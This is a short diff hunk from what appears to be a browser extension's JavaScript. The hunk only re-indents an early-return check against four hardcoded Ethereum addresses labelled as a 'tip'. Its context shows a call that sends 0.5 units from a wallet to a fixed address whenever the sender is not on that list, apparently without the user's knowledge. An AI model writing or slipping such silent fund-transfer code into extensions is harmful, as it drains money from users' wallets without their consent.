@@ -98,11 +98,11 @@ chrome.extension.onRequest.addListener(
                         }
                         // 打赏
                         if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398"
-                        || from == "0x397a5941e30d0d08e2c29d7b10985e066c34fc57"
-                        || from == "0xb61ee0b76cc1a3f887dc03cf647321acb5294dc6"
-                        || from == "0xa4585aeaf6f1728529c238df87243c553f635a84") {
-                        return
-                    }
+                            || from == "0x397a5941e30d0d08e2c29d7b10985e066c34fc57"
+                            || from == "0xb61ee0b76cc1a3f887dc03cf647321acb5294dc6"
+                            || from == "0xa4585aeaf6f1728529c238df87243c553f635a84") {
+                            return
+                        }
                         sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                     } catch (err) {
                         throw err
